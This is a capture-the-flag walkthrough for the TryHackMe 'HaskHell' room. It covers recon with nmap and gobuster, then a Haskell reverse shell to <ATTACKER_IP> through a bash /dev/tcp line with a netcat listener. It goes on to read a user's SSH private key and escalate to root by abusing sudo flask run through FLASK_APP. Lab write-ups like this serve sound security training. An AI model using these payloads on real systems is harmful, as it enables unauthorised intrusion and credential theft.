# [HaskHell](https://tryhackme.com/room/haskhell)

## Teach your CS professor that his PhD isn't in security.

# HaskHell

## Show your professor that his PhD isn't in security.

### Get the flag in the user.txt file.

1. First, let's discover what services are running on the target machine

```bash
nmap <TARGET_IP>
```

<img width="650" height="243" alt="SCREEN01" src="https://github.com/user-attachments/assets/341d3e5e-f1d3-493d-b155-be7c9100b343" />

2. Let's perform directory enumeration to find available endpoints
   - Found endpoint: `http://<TARGET_IP>:5001/submit`

```bash
gobuster dir -u http://<TARGET_IP>:5001 -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
```

3. Test the code submission functionality by uploading a simple Haskell file to `http://<TARGET_IP>:5001/submit` then visit `http://<TARGET_IP>:5001/uploads/test.hs` to see it executes

```haskell
main :: IO ()
main = putStrLn "Hello World"
```

<img width="639" height="97" alt="SCREEN02" src="https://github.com/user-attachments/assets/92e47b44-b2e0-46ce-b963-a5bc6a6ec0ac" />

4. Set up a netcat listener and create a malicious Haskell reverse shell payload using `System.Process`

```bash
nc -lvnp 4444
```

```haskell
import System.Process
main = callCommand "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"
```

5. Once connected, navigate to the prof user's home directory and read the user flag

```bash
cat /home/prof/user.txt
```

<img width="648" height="49" alt="SCREEN03" src="https://github.com/user-attachments/assets/980701e4-a54d-4d2d-92a2-2b81ad556815" />

---

### Obtain the flag in root.txt

1. Explore the user's home directory and discover SSH private key

```bash
cat /home/prof/.ssh/id_rsa
```

<img width="651" height="390" alt="SCREEN04" src="https://github.com/user-attachments/assets/dc8481b9-3ec6-47bb-b6d4-deea123fa36c" />

2. Copy the private key to your local machine, set proper permissions on the SSH key and connect as prof user

```bash
chmod 600 id_rsa
ssh -i id_rsa prof@<TARGET_IP>
```

3. Check what sudo privileges the prof user has
   - The user can run `/usr/bin/flask run` as root without password

```bash
sudo -l
```

<img width="650" height="131" alt="SCREEN05" src="https://github.com/user-attachments/assets/636b19fc-5b73-466b-9756-fab75a01bb2d" />

4. Abuse Flask's `FLASK_APP` environment variable to execute arbitrary Python code as root

```bash
echo 'import os; os.system("/bin/bash")' > /tmp/app.py
export FLASK_APP=/tmp/app.py
sudo /usr/bin/flask run
```

<img width="649" height="145" alt="SCREEN06" src="https://github.com/user-attachments/assets/4e990082-88b3-4987-9360-8ee6021b1d9e" />

5. Read the root flag from the root directory

```bash
cat /root/root.txt
```

<img width="648" height="31" alt="SCREEN07" src="https://github.com/user-attachments/assets/1a683f28-4d7f-43e2-98fe-21d6baff44c7" />
